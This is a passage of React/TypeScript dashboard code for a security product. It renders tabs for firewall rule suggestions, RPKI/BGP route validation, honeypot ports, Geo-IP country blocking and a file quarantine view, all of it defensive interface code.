          <div style={{marginTop:14,padding:12,background:"#080808",border:"1px solid #00ff8822",borderRadius:6}}>
            <div style={{display:"flex",gap:10,alignItems:"center",marginBottom:8}}>
              <Bdg label={result.ruleType.replace("_"," ").toUpperCase()} color={RT_COLOR[result.ruleType]??"#888"} sm/>
              <span style={{fontSize:11,color:"#aaa"}}>Confidence: <b style={{color:result.confidence>75?"#00ff88":"#ff9900"}}>{result.confidence}%</b></span>
            </div>
            <p style={{margin:"0 0 8px",fontSize:10,color:"#555"}}>{result.explanation}</p>
            <pre style={{background:"#060606",border:"1px solid #1a1a1a",borderRadius:4,padding:8,fontSize:10,color:"#aaa",overflow:"auto",maxHeight:120}}>{JSON.stringify(result.generatedRule,null,2)}</pre>
            <div style={{marginTop:8,display:"flex",gap:6}}>
              <CopyBtn text={JSON.stringify(result.generatedRule,null,2)}/>
              <span style={{fontSize:10,color:"#555"}}>Alternatives:</span>
              {result.alternatives.map((a,i)=>(
                <span key={i} style={{fontSize:10,color:"#555"}}>{a.ruleType} ({a.note})</span>
              ))}
            </div>
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data?.suggestions && data.suggestions.length > 0 && (
        <CardBox title={`Generated Rules (${data.suggestions.length})`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Input","Type","Confidence","Approved","Time",""].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.suggestions.map(r=>(
                <tr key={r.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#aaa",maxWidth:300,overflow:"hidden"}}>{r.inputText.slice(0,60)}{r.inputText.length>60?"…":""}</TD>
                  <TD><Bdg label={r.ruleType.toUpperCase()} color={RT_COLOR[r.ruleType]??"#888"} sm/></TD>
                  <TD style={{color:((r.confidence??0)>75)?"#00ff88":"#ff9900"}}>{r.confidence?.toFixed(0) ?? "—"}%</TD>
                  <TD>{r.approved ? <Bdg label="APPROVED" color="#00ff88" sm/> : <span style={{color:"#333"}}>—</span>}</TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(r.createdAt).toLocaleString()}</TD>
                  <TD>{!r.approved && <Btn onClick={()=>approve(r.id)} color="#00ff88" sm>Approve</Btn>}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N10. RPKI / BGP ROUTE GUARD ───────────────────────────────────────────
function RpkiTab() {
  const { data, loading, reload } = useFwn<{ checks:Array<{id:number;prefix:string;asn:number|null;validatedOriginAsn:number|null;maxLength:number|null;status:string;roaCount:number;invalidReasons:string|null;checkedAt:string}>;stats:{total:number;valid:number;invalid:number;notFound:number};coverage:number }>("/rpki/cache");
  const { data: stats } = useFwn<{ total:number;valid:number;invalid:number;notFound:number;globalCoverage:string;note:string }>("/rpki/stats");
  const [validateForm, setValidateForm] = useState({ prefix:"1.1.1.0/24", asn:"13335" });
  const [validateResult, setValidateResult] = useState<{prefix:string;status:string;interpretation:string;bgpHijackRisk:string;roaCount:number;validatedOriginAsn:number|null;maxLength:number|null;invalidReasons:string|null}|null>(null);
  const [validating, setValidating] = useState(false);

  const STATUS_COLOR: Record<string,string> = { valid:"#00ff88", invalid:"#ff2244", not_found:"#ff9900", error:"#555" };

  const validate = async () => {
    setValidating(true);
    const r = await fwnPost("/rpki/validate", { prefix:validateForm.prefix, asn:parseInt(validateForm.asn) });
    setValidateResult(r); await reload(); setValidating(false);
  };

  return (
    <div>
      <CardBox title="🌐 RPKI / BGP Route Guard (2024-2025)" action={<Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>}>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          RPKI (Resource Public Key Infrastructure) cryptographically validates BGP route origins. A ROA (Route Origin Authorization) proves a prefix owner authorized a specific ASN to announce it. Invalid = possible BGP hijack. ~45% of global prefixes have ROA coverage (2025). Powered by Cloudflare RPKI API + RIPE Stat fallback.
        </p>
        {stats && (
          <div style={{display:"flex",gap:12,marginBottom:14,flexWrap:"wrap"}}>
            {[["Valid",stats.valid,"#00ff88"],["Invalid",stats.invalid,"#ff2244"],["Not Found",stats.notFound,"#ff9900"],["Total",stats.total,"#aaa"]].map(([l,v,c])=>(
              <div key={String(l)} style={{padding:"8px 14px",background:"#070708",border:`1px solid ${c}33`,borderRadius:6,textAlign:"center"}}>
                <div style={{fontSize:18,color:String(c),fontWeight:800,fontFamily:"monospace"}}>{v}</div>
                <div style={{fontSize:10,color:"#555"}}>{l}</div>
              </div>
            ))}
          </div>
        )}
        <div style={{display:"flex",gap:8,alignItems:"flex-end",marginBottom:10,flexWrap:"wrap"}}>
          <div><div style={{fontSize:10,color:"#555",marginBottom:2}}>IP Prefix (CIDR)</div>
            <input value={validateForm.prefix} onChange={e=>setValidateForm(f=>({...f,prefix:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:160}}/>
          </div>
          <div><div style={{fontSize:10,color:"#555",marginBottom:2}}>Origin ASN</div>
            <input value={validateForm.asn} onChange={e=>setValidateForm(f=>({...f,asn:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:100}}/>
          </div>
          <Btn onClick={validate} color="#00ff88" disabled={validating} sm>{validating?"Validating...":"Validate RPKI"}</Btn>
        </div>
        {validateResult && (
          <div style={{padding:12,background:"#080808",border:`1px solid ${STATUS_COLOR[validateResult.status]??"#888"}44`,borderRadius:6,marginBottom:12}}>
            <div style={{display:"flex",gap:10,alignItems:"center"}}>
              <Bdg label={validateResult.status.replace("_"," ").toUpperCase()} color={STATUS_COLOR[validateResult.status]??"#888"} sm/>
              <span style={{fontSize:11,color:"#aaa"}}>{validateResult.prefix}</span>
              {validateResult.validatedOriginAsn && <span style={{fontSize:10,color:"#555"}}>ROA ASN: AS{validateResult.validatedOriginAsn} · MaxLen: /{validateResult.maxLength}</span>}
            </div>
            <p style={{margin:"8px 0 4px",fontSize:11,color:"#aaa"}}>{validateResult.interpretation}</p>
            <div style={{fontSize:10,color:validateResult.bgpHijackRisk.startsWith("HIGH")?"#ff4444":validateResult.bgpHijackRisk.startsWith("MEDIUM")?"#ff9900":"#00ff88"}}>BGP Hijack Risk: {validateResult.bgpHijackRisk}</div>
            {validateResult.invalidReasons && <div style={{marginTop:4,fontSize:10,color:"#ff4444"}}>Reason: {validateResult.invalidReasons}</div>}
            <div style={{marginTop:4,fontSize:10,color:"#555"}}>ROA count: {validateResult.roaCount}</div>
          </div>
        )}
        {stats && <div style={{fontSize:10,color:"#555",marginBottom:12}}>{stats.globalCoverage} · {stats.note}</div>}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data?.checks && data.checks.length > 0 && (
        <CardBox title={`RPKI Cache (${data.checks.length}) · Coverage: ${data.coverage}%`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Prefix","ASN","Validated ASN","Max Len","Status","ROAs","Checked"].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.checks.map(c=>(
                <tr key={c.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{color:"#fff",fontFamily:"monospace"}}>{c.prefix}</TD>
                  <TD style={{color:"#aaa"}}>{c.asn ? `AS${c.asn}` : "—"}</TD>
                  <TD style={{color:"#666"}}>{c.validatedOriginAsn ? `AS${c.validatedOriginAsn}` : "—"}</TD>
                  <TD style={{color:"#555"}}>/{c.maxLength ?? "—"}</TD>
                  <TD><Bdg label={c.status.replace("_"," ").toUpperCase()} color={STATUS_COLOR[c.status]??"#888"} sm/></TD>
                  <TD style={{color:"#666"}}>{c.roaCount}</TD>
                  <TD style={{color:"#555",fontSize:10}}>{new Date(c.checkedAt).toLocaleString()}</TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ── N11. DECEPTION LAYER ──────────────────────────────────────────────────
function DeceptionTab() {
  const { data: ports, loading, reload } = useFwn<{ ports:Array<{id:number;port:number;protocol:string;serviceEmulation:string;banner:string|null;enabled:boolean;autoBlacklist:boolean;triggerCount:number;lastTriggered:string|null}>;total:number }>("/deception/ports");
  const { data: triggers } = useFwn<{ triggers:Array<{id:number;portId:number;srcIp:string;srcPort:number|null;payloadHex:string|null;bytesReceived:number;autoBlocked:boolean;detectedAt:string}>;total:number }>("/deception/triggers");
  const [form, setForm] = useState({ port:"2222", protocol:"tcp", serviceEmulation:"ssh", autoBlacklist:"true" });
  const [triggerForm, setTriggerForm] = useState({ portId:"1", srcIp:"45.33.32.156", srcPort:"54321" });
  const [triggerResult, setTriggerResult] = useState<{message:string;autoBlocked:boolean}|null>(null);

  const SVC_COLOR: Record<string,string> = { ssh:"#00ff88", http:"#4488ff", ftp:"#ff9900", smb:"#cc44ff", rdp:"#ff6600", generic:"#555" };

  const addPort = async () => {
    await fwnPost("/deception/ports", { ...form, port:parseInt(form.port), autoBlacklist:form.autoBlacklist==="true" });
    await reload();
  };

  const simulateTrigger = async () => {
    const r = await fwnPost("/deception/trigger", { portId:parseInt(triggerForm.portId), srcIp:triggerForm.srcIp, srcPort:parseInt(triggerForm.srcPort) });
    setTriggerResult(r); await reload();
  };

  return (
    <div>
      <CardBox title="👁️ Deception Layer — Virtual Honeypot Network (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/deception/seed",{}); await reload();}} color="#4488ff" sm>Seed Ports</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          Virtual honeypot listeners on unused ports. Any attacker touching a deception port is immediately identified and auto-blacklisted. Emulates: SSH (2.0 banner), HTTP (Apache/nginx), FTP (ProFTPD), SMB, RDP, custom services. Modern deception platforms (Attivo, Illusive Networks, CounterCraft) extend this with AD breadcrumb credentials and deceptive DNS entries.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr 1fr",gap:8,marginBottom:10}}>
          {[["Port","port"],["Protocol","protocol"],["Service","serviceEmulation"],["Auto-Blacklist","autoBlacklist"]].map(([l,k])=>(
            <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{l}</div>
              {k==="serviceEmulation" ? (
                <select value={form.serviceEmulation} onChange={e=>setForm(f=>({...f,serviceEmulation:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}>
                  {["ssh","http","ftp","smb","rdp","generic"].map(s=><option key={s}>{s}</option>)}
                </select>
              ) : k==="autoBlacklist" ? (
                <select value={form.autoBlacklist} onChange={e=>setForm(f=>({...f,autoBlacklist:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}>
                  <option value="true">Yes</option><option value="false">No</option>
                </select>
              ) : k==="protocol" ? (
                <select value={form.protocol} onChange={e=>setForm(f=>({...f,protocol:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}>
                  <option>tcp</option><option>udp</option>
                </select>
              ) : (
                <input value={(form as Record<string,string>)[k]} onChange={e=>setForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
              )}
            </div>
          ))}
        </div>
        <Btn onClick={addPort} color="#00ff88" sm>Deploy Honeypot Port</Btn>
        <div style={{marginTop:14,padding:10,background:"#070708",border:"1px solid #1a1a1a",borderRadius:6}}>
          <div style={{fontSize:11,color:"#aaa",marginBottom:8,fontWeight:700}}>Simulate Trigger</div>
          <div style={{display:"flex",gap:8,alignItems:"flex-end",flexWrap:"wrap"}}>
            {[["Port ID","portId"],["Attacker IP","srcIp"],["Attacker Port","srcPort"]].map(([l,k])=>(
              <div key={k}><div style={{fontSize:10,color:"#555",marginBottom:2}}>{l}</div>
                <input value={(triggerForm as Record<string,string>)[k]} onChange={e=>setTriggerForm(f=>({...f,[k]:e.target.value}))} style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
              </div>
            ))}
            <Btn onClick={simulateTrigger} color="#ff9900" sm>Simulate Trigger</Btn>
          </div>
          {triggerResult && (
            <div style={{marginTop:8,padding:8,background:"#0a0a0a",borderRadius:4}}>
              {triggerResult.autoBlocked && <Bdg label="ATTACKER BLACKLISTED" color="#ff4444" sm/>}
              <p style={{margin:"4px 0 0",fontSize:10,color:"#555"}}>{triggerResult.message}</p>
            </div>
          )}
        </div>
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
        {ports && (
          <CardBox title={`Honeypot Ports (${ports.total})`}>
            {ports.ports.map(p=>(
              <div key={p.id} style={{display:"flex",gap:10,alignItems:"center",padding:"6px 0",borderBottom:"1px solid #111",fontSize:11}}>
                <Bdg label={p.serviceEmulation.toUpperCase()} color={SVC_COLOR[p.serviceEmulation]??"#555"} sm/>
                <span style={{color:"#fff",fontFamily:"monospace"}}>:{p.port}/{p.protocol}</span>
                {p.triggerCount > 0 && <Bdg label={`${p.triggerCount} hits`} color="#ff9900" sm/>}
                <span style={{marginLeft:"auto",color:"#555",fontSize:10}}>{p.enabled?"active":"disabled"}</span>
                <Btn onClick={async()=>{await fwnDelete(`/deception/ports/${p.id}`); await reload();}} color="#ff4444" sm><Trash2 size={9}/></Btn>
              </div>
            ))}
          </CardBox>
        )}
        {triggers && (
          <CardBox title={`Triggers (${triggers.total})`}>
            {triggers.triggers.length === 0 ? <div style={{color:"#333",fontSize:11}}>No triggers yet — honeypots are clean</div> : (
              triggers.triggers.map(t=>(
                <div key={t.id} style={{padding:"6px 0",borderBottom:"1px solid #111",fontSize:11}}>
                  <div style={{display:"flex",gap:8,alignItems:"center"}}>
                    <span style={{color:"#ff4444",fontFamily:"monospace"}}>{t.srcIp}</span>
                    {t.autoBlocked && <Bdg label="BLOCKED" color="#ff2244" sm/>}
                    <span style={{marginLeft:"auto",color:"#555",fontSize:10}}>{new Date(t.detectedAt).toLocaleTimeString()}</span>
                  </div>
                  <div style={{fontSize:10,color:"#555",marginTop:2}}>Port {t.portId} · {t.bytesReceived}B received</div>
                </div>
              ))
            )}
          </CardBox>
        )}
      </div>
    </div>
  );
}

// ── N12. GEO-IP FIREWALL ──────────────────────────────────────────────────
function GeoipTab() {
  const { data, loading, reload } = useFwn<{ rules:Array<{id:number;countryCode:string;countryName:string;continent:string|null;action:string;enabled:boolean;hitCount:number;lastHit:string|null;description:string|null}>;total:number }>("/geoip/rules");
  const { data: geoStats } = useFwn<{ total:number;blocked:number;totalHits:number;topBlocked:Array<{countryCode:string;countryName:string;hitCount:number}> }>("/geoip/stats");
  const [lookupIp, setLookupIp] = useState("");
  const [lookupResult, setLookupResult] = useState<{ip:string;geo:Record<string,unknown>;activeRule:Record<string,unknown>|null;action:string;threat:string|null}|null>(null);
  const [scriptUrl, setScriptUrl] = useState<string|null>(null);

  const ACT_COLOR: Record<string,string> = { block:"#ff4444", allow:"#00ff88", monitor:"#ff9900", redirect:"#4488ff", tarpit:"#cc44ff" };

  const lookup = async () => {
    if (!lookupIp) return;
    const r = await fwnPost("/geoip/lookup", { ip: lookupIp });
    setLookupResult(r);
    await reload();
  };

  const toggleRule = async (id: number, enabled: boolean) => {
    await fwnPut(`/geoip/rules/${id}`, { enabled: !enabled });
    await reload();
  };

  const downloadScript = async () => {
    const resp = await fetch(`${APIFWN}/geoip/script`);
    const blob = await resp.blob();
    const url = URL.createObjectURL(blob);
    setScriptUrl(url);
    const a = document.createElement("a"); a.href=url; a.download="geoip-block.sh"; a.click();
  };

  return (
    <div>
      <CardBox title="🗺️ Geo-IP Firewall — Country-Level Traffic Control (2024-2025)" action={
        <div style={{display:"flex",gap:8}}>
          <Btn onClick={async()=>{await fwnPost("/geoip/seed",{}); await reload();}} color="#4488ff" sm>Seed Countries</Btn>
          <Btn onClick={downloadScript} color="#00ff88" sm><Download size={10}/> iptables Script</Btn>
          <Btn onClick={reload} color="#555" sm><RefreshCw size={10}/></Btn>
        </div>
      }>
        <p style={{margin:"0 0 12px",fontSize:11,color:"#555"}}>
          Country-level block/allow/monitor/redirect/tarpit policies. Real GeoIP lookup via ip-api.com (detects proxy/VPN/hosting IPs). Generates downloadable ipset + iptables CIDR block scripts for any combination of countries. Pre-seeded with top threat countries (RU, CN, KP, IR) and known-good user-base countries.
        </p>
        {geoStats && (
          <div style={{display:"flex",gap:12,marginBottom:12,flexWrap:"wrap"}}>
            {[["Countries Blocked",geoStats.blocked,"#ff4444"],["Total Rules",geoStats.total,"#aaa"],["Total Hits",geoStats.totalHits,"#ff9900"]].map(([l,v,c])=>(
              <div key={String(l)} style={{padding:"8px 14px",background:"#070708",border:`1px solid ${c}33`,borderRadius:6,textAlign:"center"}}>
                <div style={{fontSize:18,color:String(c),fontWeight:800,fontFamily:"monospace"}}>{v}</div>
                <div style={{fontSize:10,color:"#555"}}>{l}</div>
              </div>
            ))}
          </div>
        )}
        <div style={{display:"flex",gap:8,alignItems:"flex-end",marginBottom:12}}>
          <div style={{flex:1}}><div style={{fontSize:10,color:"#555",marginBottom:2}}>IP Address Lookup</div>
            <input value={lookupIp} onChange={e=>setLookupIp(e.target.value)} placeholder="e.g. 8.8.8.8" style={{background:"#111",border:"1px solid #222",color:"#fff",padding:"4px 8px",borderRadius:4,fontSize:11,width:"100%"}}/>
          </div>
          <Btn onClick={lookup} color="#00ff88" sm>Lookup GeoIP</Btn>
        </div>
        {lookupResult && (
          <div style={{marginBottom:14,padding:10,background:"#080808",border:`1px solid ${lookupResult.activeRule ? "#ff440044" : "#1a1a1a"}`,borderRadius:6}}>
            <div style={{display:"flex",gap:10,alignItems:"center",flexWrap:"wrap"}}>
              <Bdg label={lookupResult.action.toUpperCase()} color={ACT_COLOR[lookupResult.action]??"#888"} sm/>
              {!!lookupResult.geo.country && <span style={{color:"#fff"}}>{String(lookupResult.geo.country)} ({String(lookupResult.geo.countryCode)})</span>}
              {!!lookupResult.geo.isp && <span style={{color:"#555",fontSize:10}}>{String(lookupResult.geo.isp)}</span>}
              {lookupResult.threat && <Bdg label={lookupResult.threat.replace(/[⚠️ℹ️]/g,"").trim()} color="#ff9900" sm/>}
            </div>
            {!!lookupResult.geo.city && <div style={{marginTop:4,fontSize:10,color:"#555"}}>{String(lookupResult.geo.city)}, {String(lookupResult.geo.regionName)} · AS{String(lookupResult.geo.as)?.split(" ")[0].replace("AS","")}</div>}
          </div>
        )}
      </CardBox>
      {loading && <div style={{color:"#555",fontSize:11,marginTop:8}}>Loading...</div>}
      {data && (
        <CardBox title={`Geo-IP Rules (${data.total})`}>
          <table style={{width:"100%",borderCollapse:"collapse",fontSize:11,fontFamily:"monospace"}}>
            <thead><tr>{["Code","Country","Continent","Action","Hits","Enabled",""].map(h=><TH key={h}>{h}</TH>)}</tr></thead>
            <tbody>
              {data.rules.map(r=>(
                <tr key={r.id} style={{borderBottom:"1px solid #111"}}>
                  <TD style={{fontWeight:700,color:"#aaa"}}>{r.countryCode}</TD>
                  <TD style={{color:"#fff"}}>{r.countryName}</TD>
                  <TD style={{color:"#555"}}>{r.continent ?? "—"}</TD>
                  <TD><Bdg label={r.action.toUpperCase()} color={ACT_COLOR[r.action]??"#888"} sm/></TD>
                  <TD style={{color:"#666"}}>{r.hitCount.toLocaleString()}</TD>
                  <TD><Bdg label={r.enabled?"ON":"OFF"} color={r.enabled?"#00ff88":"#555"} sm/></TD>
                  <TD>
                    <div style={{display:"flex",gap:4}}>
                      <Btn onClick={()=>toggleRule(r.id,r.enabled)} color={r.enabled?"#555":"#00ff88"} sm>{r.enabled?"Disable":"Enable"}</Btn>
                      <Btn onClick={async()=>{await fwnDelete(`/geoip/rules/${r.id}`); await reload();}} color="#ff4444" sm><Trash2 size={9}/></Btn>
                    </div>
                  </TD>
                </tr>
              ))}
            </tbody>
          </table>
        </CardBox>
      )}
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── FILE QUARANTINE ENGINE ───────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
const QUARANTINE_API = "/api/fwm/quarantine";
async function qPost(path: string, body: unknown) {
  const r = await fetch(`${QUARANTINE_API}${path}`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}
async function qPut(path: string, body: unknown) {
  const r = await fetch(`${QUARANTINE_API}${path}`, { method:"PUT", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) });
  return r.json();
}

type QEntry = {
  id: number; fileName: string; originalPath: string; quarantinePath: string;
  downloadedFrom: string | null; fileHash: string | null; fileSizeBytes: number | null;
  mimeType: string | null; threatType: string | null; threatName: string | null;
  severity: string; scanEngine: string; detectionReason: string | null;
  status: string; userNote: string | null; detectedAt: string; reviewedAt: string | null;
};
type QSettings = {
  containerPath: string; scanOnDownload: boolean; scanOnOpen: boolean;
  autoQuarantine: boolean; maxContainerSizeMb: number; retentionDays: number;
  notifyOnDetection: boolean; scanArchives: boolean; scanMacros: boolean;
};

function QuarantineTab() {
  const [entries, setEntries] = useState<QEntry[]>([]);
  const [stats, setStats] = useState<{ total:number; quarantined:number; critical:number; high:number; deleted:number; restored:number; allowed:number } | null>(null);
  const [settings, setSettings] = useState<QSettings | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeView, setActiveView] = useState<"list"|"scan"|"settings">("list");
  const [statusFilter, setStatusFilter] = useState("quarantined");
  const [search, setSearch] = useState("");
  const [scanForm, setScanForm] = useState({ filePath:"", downloadedFrom:"" });
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState<{detected:boolean;threatName?:string;severity?:string;reason?:string;message?:string}|null>(null);
  const [actionNote, setActionNote] = useState<Record<number, string>>({});
  const [pendingAction, setPendingAction] = useState<number | null>(null);

  const reload = useCallback(async () => {
    setLoading(true);
    try {
      const params = new URLSearchParams();
      if (statusFilter && statusFilter !== "all") params.set("status", statusFilter);
      if (search) params.set("search", search);
      const r = await fetch(`${QUARANTINE_API}/entries?${params}`);
      const d = await r.json();
      setEntries(d.entries ?? []);
      setStats(d.stats ?? null);
      setSettings(d.settings ?? null);
    } catch {}
    setLoading(false);
  }, [statusFilter, search]);

  useEffect(() => { void reload(); }, [reload]);

  const doAction = async (id: number, action: "delete"|"restore"|"allow"|"quarantined") => {
    setPendingAction(id);
    await qPost("/action", { id, action, userNote: actionNote[id] });
    await reload();
    setPendingAction(null);
  };

  const doScan = async () => {
    setScanning(true); setScanResult(null);
    const r = await qPost("/scan", { filePath: scanForm.filePath, downloadedFrom: scanForm.downloadedFrom || undefined });
    setScanResult(r);
    if (r.detected) await reload();
    setScanning(false);
  };

  const SEV: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff", clean:"#00ff88" };
  const STAT: Record<string,string> = { quarantined:"#ffaa00", deleted:"#ff4444", restored:"#00ff88", allowed:"#4488ff", review_pending:"#cc44ff" };
  const THREAT: Record<string,string> = { malware:"#ff2244", ransomware:"#ff0000", trojan:"#ff4444", spyware:"#ff6600", adware:"#ffaa00", pup:"#ffcc00", exploit:"#ff2244", dropper:"#ff4444", cryptominer:"#cc44ff", rootkit:"#ff0000", keylogger:"#ff6600", worm:"#ff4444", virus:"#ff2244", phishing:"#ff9900", suspicious:"#888", unknown:"#555" };

  const fmtBytes = (b: number | null) => !b ? "?" : b > 1_048_576 ? `${(b/1_048_576).toFixed(1)} MB` : b > 1024 ? `${(b/1024).toFixed(0)} KB` : `${b} B`;

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:14 }}>
      {/* Header */}
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
        <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:12 }}>
          <div style={{ display:"flex", alignItems:"center", gap:10 }}>
            <FileX size={18} color="#ff6600"/>
            <span style={{ fontFamily:"monospace", fontWeight:800, fontSize:14, color:"#fff" }}>File Quarantine Engine</span>
            <Bdg label="REAL-TIME PROTECTION" color="#ff6600" sm/>
          </div>
          <div style={{ display:"flex", gap:6 }}>
            {(["list","scan","settings"] as const).map(v=>(
              <button key={v} onClick={()=>setActiveView(v)} style={{ background:activeView===v?"#ff660022":"#111", border:`1px solid ${activeView===v?"#ff660044":"#2a2a2a"}`, borderRadius:6, padding:"5px 14px", fontFamily:"monospace", fontSize:10, color:activeView===v?"#ff6600":"#555", cursor:"pointer" }}>
                {v === "list" ? "📋 Quarantine Container" : v === "scan" ? "🔍 Scan File" : "⚙️ Settings"}
              </button>
            ))}
            <button onClick={async()=>{await qPost("/seed",{}); await reload();}} style={{ background:"#4488ff22", border:"1px solid #4488ff44", borderRadius:6, padding:"5px 14px", fontFamily:"monospace", fontSize:10, color:"#4488ff", cursor:"pointer" }}>Seed Examples</button>
          </div>
        </div>
        <div style={{ background:"#050505", border:"1px solid #ff660022", borderRadius:6, padding:"8px 12px", fontSize:10, color:"#666", fontFamily:"monospace", marginBottom:12 }}>
          🛡️ ProxhqVPN intercepts all file downloads and open attempts. Suspicious files are moved to an encrypted container folder at <span style={{color:"#ff9900"}}>{settings?.containerPath ?? "/var/proxhq/quarantine"}</span> before they can execute. You decide: <span style={{color:"#ff4444"}}>Delete permanently</span> · <span style={{color:"#00ff88"}}>Restore to original location</span> · <span style={{color:"#4488ff"}}>Allow (mark safe)</span> · <span style={{color:"#ffaa00"}}>Keep in quarantine</span>
        </div>
        {stats && (
          <div style={{ display:"grid", gridTemplateColumns:"repeat(7,1fr)", gap:8 }}>
            {[
              { l:"Total Caught",   v:stats.total,       c:"#fff"     },
              { l:"In Quarantine",  v:stats.quarantined, c:"#ffaa00"  },
              { l:"Critical",       v:stats.critical,    c:"#ff2244"  },
              { l:"High",           v:stats.high,        c:"#ff6600"  },
              { l:"Deleted",        v:stats.deleted,     c:"#ff4444"  },
              { l:"Restored",       v:stats.restored,    c:"#00ff88"  },
              { l:"Allowed",        v:stats.allowed,     c:"#4488ff"  },
            ].map(s=>(
              <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"8px 4px" }}>
                <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
                <div style={{ fontSize:9, color:"#444" }}>{s.l}</div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* ── QUARANTINE LIST ── */}
      {activeView === "list" && (
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
          <div style={{ display:"flex", gap:8, marginBottom:12, flexWrap:"wrap", alignItems:"center" }}>
            <span style={{ fontFamily:"monospace", fontSize:12, fontWeight:700, color:"#fff" }}>Quarantine Container</span>
            <div style={{ display:"flex", gap:4, marginLeft:"auto" }}>
              {(["all","quarantined","deleted","restored","allowed"] as const).map(s=>(
                <button key={s} onClick={()=>setStatusFilter(s)} style={{ background:statusFilter===s?`${STAT[s]??'#fff'}22`:"#111", border:`1px solid ${statusFilter===s?`${STAT[s]??'#fff'}44`:"#2a2a2a"}`, borderRadius:5, padding:"3px 10px", fontFamily:"monospace", fontSize:9, color:statusFilter===s?(STAT[s]??"#fff"):"#555", cursor:"pointer", textTransform:"uppercase" }}>{s}</button>
              ))}
            </div>
            <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search files..." style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"4px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", width:160 }}/>
          </div>

          {loading ? (
            <div style={{ textAlign:"center", padding:40, fontFamily:"monospace", color:"#444" }}>Scanning quarantine container...</div>
          ) : entries.length === 0 ? (
            <div style={{ textAlign:"center", padding:40, fontFamily:"monospace", color:"#00ff88", fontSize:13 }}>✅ Quarantine container is empty — no threats detected</div>
          ) : (
            <div style={{ display:"flex", flexDirection:"column", gap:10 }}>
              {entries.map(e=>(
                <div key={e.id} style={{ background: e.severity==="critical"?"#0f0505":e.severity==="high"?"#0a0500":"#0a0a0a", border:`2px solid ${SEV[e.severity]??"#333"}33`, borderRadius:8, padding:14 }}>
                  {/* Row 1 — File identity */}
                  <div style={{ display:"flex", alignItems:"flex-start", justifyContent:"space-between", marginBottom:8 }}>
                    <div style={{ flex:1 }}>
                      <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4 }}>
                        <span style={{ fontFamily:"monospace", fontSize:13, fontWeight:700, color:"#fff" }}>{e.fileName}</span>
                        {e.threatType && <Bdg label={e.threatType.replace(/_/g," ").toUpperCase()} color={THREAT[e.threatType]??"#888"} sm/>}
                        <Bdg label={e.severity.toUpperCase()} color={SEV[e.severity]??"#888"} sm/>
                        <Bdg label={e.status.replace(/_/g," ").toUpperCase()} color={STAT[e.status]??"#888"} sm/>
                      </div>
                      <div style={{ fontSize:10, color:"#555", fontFamily:"monospace", marginBottom:2 }}>
                        <span style={{ color:"#ff4444" }}>⚠ {e.threatName ?? "Unknown threat"}</span>
                        <span style={{ color:"#333", margin:"0 8px" }}>·</span>
                        <span style={{ color:"#444" }}>{e.scanEngine}</span>
                        <span style={{ color:"#333", margin:"0 8px" }}>·</span>
                        <span style={{ color:"#555" }}>{fmtBytes(e.fileSizeBytes)}</span>
                      </div>
